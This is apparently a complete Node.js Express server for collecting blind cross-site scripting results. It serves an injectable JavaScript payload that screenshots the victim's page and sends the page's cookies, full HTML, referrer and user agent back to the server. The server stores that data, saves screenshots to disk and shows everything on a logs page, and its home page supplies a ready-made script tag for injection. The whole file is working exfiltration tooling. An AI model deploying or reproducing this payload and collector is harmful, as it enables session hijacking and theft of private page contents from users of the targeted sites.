const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Create "screenshots" folder if it doesn't exist
const screenshotDir = path.join(__dirname, 'screenshots');
if (!fs.existsSync(screenshotDir)) {
  fs.mkdirSync(screenshotDir);
}

// Middleware
app.use(bodyParser.json({ limit: '15mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/screenshots', express.static(screenshotDir));

// Serve the XSS payload
app.get('/xss.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`
    (function(){
      var s = document.createElement('script');
      s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
      s.onload = function() {
        html2canvas(document.body).then(function(canvas) {
          fetch('https://${req.headers.host}/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              screenshot: canvas.toDataURL('image/png'),
              cookies: document.cookie,
              userAgent: navigator.userAgent,
              referer: document.referrer,
              origin: location.origin,
              html: document.documentElement.outerHTML,
              iframe: window.self !== window.top,
              time: new Date().toISOString()
            })
          });
        });
      };
      document.head.appendChild(s);
    })();
  `);
});

// Log and save screenshot
app.post('/collect', (req, res) => {
  const {
    screenshot, cookies, userAgent, referer,
    origin, html, iframe, time
  } = req.body;

  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  let screenshotPath = null;
  if (screenshot) {
    const base64Data = screenshot.replace(/^data:image\/png;base64,/, "");
    screenshotPath = path.join('screenshots', `screenshot-${Date.now()}.png`);
    fs.writeFileSync(screenshotPath, base64Data, 'base64');
  }

  const logEntry = {
    ip,
    userAgent,
    referer,
    origin,
    cookies,
    html,
    iframe,
    time,
    screenshot: screenshotPath
  };

  console.log("🚨 Blind XSS Triggered:", logEntry);
  fs.appendFileSync('logs.txt', JSON.stringify(logEntry) + "\n");

  res.status(200).send('OK');
});

// Home route
app.get('/', (req, res) => {
  res.send(`
    <h2>🔍 Blind XSS Collector Running</h2>
    <p>Use this payload:</p>
    <pre>&lt;script src="https://${req.headers.host}/xss.js"&gt;&lt;/script&gt;</pre>
    <p>Check logs at <a href="/view-logs">/view-logs</a></p>
  `);
});

// Logs view
app.get('/view-logs', (req, res) => {
  const logs = fs.existsSync('logs.txt') ? fs.readFileSync('logs.txt', 'utf8') : 'No logs yet.';
  res.setHeader('Content-Type', 'text/plain');
  res.send(logs);
});

app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
});
